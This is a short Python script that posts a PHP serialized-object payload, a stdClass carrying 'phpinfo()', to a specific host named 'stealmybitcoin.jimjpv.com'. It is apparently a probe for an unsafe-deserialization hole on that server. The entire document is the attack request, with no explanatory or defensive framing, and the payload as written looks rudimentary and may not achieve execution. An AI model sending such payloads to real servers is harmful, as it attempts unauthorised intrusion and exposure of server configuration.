```python
import requests

url = 'https://stealmybitcoin.jimjpv.com/'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = {
    'a': 'o:8:"stdClass":1:{s:3:"obj";s:7:"phpinfo()";}'
}

response = requests.post(url, headers=headers, data=data)

print(response.text)
```